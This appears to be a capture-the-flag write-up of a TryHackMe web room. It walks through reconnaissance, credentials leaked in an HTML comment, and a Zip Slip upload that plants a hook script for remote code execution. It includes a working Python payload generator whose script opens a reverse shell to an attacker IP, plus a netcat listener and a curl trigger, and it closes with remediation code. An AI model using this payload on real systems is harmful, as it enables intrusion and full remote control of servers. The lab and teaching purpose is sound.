# Stay Noticed — TryHackMe

> **Difficulty:** Medium  
> **Category:** Web Exploitation · Directory Traversal · Zip Slip · RCE  
> **Date:** 2025-08-09  
> **Room:** [https://tryhackme.com/room/staynoticed](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

---

## overview

Python web application (Gunicorn) running on port 5000 with a "shells" upload panel — ZIP files containing a `shell.json` manifest and scripts that trigger automation hooks in the background. Initial access comes from credentials leaked in the HTML source code. The main exploitation combines **Directory Traversal with Zip Slip**: a byte-level forged ZIP file writes a malicious Python script directly into the application's `/hooks/` folder, outside the isolation directory, where it is automatically executed by the backend — establishing a reverse shell.

---

## reconnaissance

```bash
# Port scan
nmap -sV -sC <TARGET_IP>

# Directory fuzzing
dirb http://<TARGET_IP>:5000/ /usr/share/dirb/wordlists/common.txt
```

| port | service | detail |
|---|---|---|
| 5000/tcp | http | Python/Gunicorn — redirects (302) to /login |

Directories discovered by Dirb:

```
/login
/dashboard
/upload
```

The 302 redirect to `/login` confirms an authenticated panel. `/upload` is the most interesting vector — server-side file processing is always a priority attack surface.

---

## enumeration

### Source code review — leaked credentials

Accessing `/login` in the browser and inspecting the HTML (`Ctrl+U`), a developer comment exposes test credentials:

```html
<!-- default credentials: concierge / StayNoticed2024! -->
```

Classic Information Disclosure — credentials left in an HTML comment block, invisible in the UI but fully accessible in the source code.

Login via POST with `concierge:StayNoticed2024!` grants access to `/dashboard`.

---

## exploitation

### Zip Slip — Directory Traversal via decompression

The dashboard instructs uploading ZIP files containing a `shell.json` (manifest) and scripts executed as "automation hooks" by the backend. The application extracts the ZIP without sanitizing internal file paths — opening the door to **Zip Slip**.

**How it works:**

When generating a ZIP with Python, it's possible to manually define the destination path of each internal file. By using `../` sequences in the filename, the server's extractor walks back up the directory tree — writing the file outside the isolation subdirectory and directly into `/hooks/`, where the application triggers its automation routines.

**Payload generator script (`gerador_zipslip.py`):**

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

```bash
python3 gerador_zipslip.py
```

The path `../../hooks/callback.py` instructs the extractor to exit the randomly generated isolation subdirectory (e.g. `shells/16ac.../`) and write the script directly into `/hooks/` — the folder monitored by the backend for automatic execution.

> **Vulnerability:** Zip Slip — Directory Traversal via decompression (CWE-22)  
> **Root cause:** No sanitization of internal ZIP paths before extraction. The `../` characters are not filtered, allowing arbitrary file writes outside the designated directory.  
> **MITRE ATT&CK:** T1083 — File and Directory Discovery / T1059 — Command and Scripting Interpreter

### Payload delivery and execution

**Listener:**

```bash
nc -lnvp 4444
```

**Upload of the malicious file:**

The `reverse-shell.zip` file is sent via the web interface. The upload uses `multipart/form-data` encoding, ensuring no bytes of the compressed file are corrupted in transit.

**Hook trigger:**

```bash
curl http://<TARGET_IP>:5000/shells/<id>/shell.json
```

Accessing the route forces the backend to process the manifest and execute the `callback.py` written to `/hooks/`. The script opens a TCP connection back to the listener on port 4444, duplicates the file descriptors (`os.dup2`), and spawns an interactive shell with `pty.spawn("/bin/bash")`.

---

## flags

```bash
# In the reverse shell:
cat /home/*/flag.txt
```

The `*` wildcard instructs the system to search for `flag.txt` across all user directories under `/home/` — eliminating the need to guess the local username.

```
THM{REDACTED}
```

---

## attack chain

```
Nmap → port 5000 (Gunicorn) · 302 redirect to /login
          │
          ▼
Dirb → /login · /dashboard · /upload
          │
          ▼
Source code /login → HTML comment → concierge / StayNoticed2024!
          │
          ▼
POST /login → authenticated access → /dashboard
          │
          ▼
/upload → ZIP with shell.json + automation hooks
          │
          ▼
Zip Slip: ../../hooks/callback.py inside the ZIP
          │
          ▼
python3 gerador_zipslip.py → reverse-shell.zip
          │
          ▼
nc -lnvp 4444 (listener)
          │
          ▼
Upload via multipart/form-data → extraction on server
          │
          ▼
curl /shells/<id>/shell.json → backend executes callback.py
          │
          ▼
Reverse shell → TCP → port 4444
          │
          ▼
cat /home/*/flag.txt → THM{REDACTED}
```

---

## what I learned

Zip Slip is a vulnerability that seems obscure but is surprisingly common in applications that process compressed files without proper validation. The critical point is that extraction utilities in most languages **do not sanitize paths by default** — the responsibility to validate falls entirely on the developer.

What made this attack possible was the combination of three factors: the application accepted ZIP uploads, extracted content without checking internal paths, and automatically executed files placed in `/hooks/`. Each of these behaviors individually would be acceptable — together, they created a complete RCE chain.

Generating the payload in Python instead of using off-the-shelf tools was intentional: OS compression utilities often automatically clean or normalize `../` characters. Manipulating the ZIP metadata directly via code is the only guaranteed way to preserve the path traversal in the final file.

The `cat /home/*/flag.txt` was also a good reminder: when you don't know the target username, wildcards avoid unnecessary trial and error.

**Remediation:**

```python
# Insecure — direct extraction without validation
zip_ref.extractall(destination)

# Correct — sanitize each path before extracting
import os

def safe_extract(zip_file, destination):
    for member in zip_file.namelist():
        member_path = os.path.realpath(os.path.join(destination, member))
        if not member_path.startswith(os.path.realpath(destination)):
            raise Exception(f"Zip Slip detected: {member}")
    zip_file.extractall(destination)
```

Also: never automatically execute files from user uploads without rigorous content and origin validation.
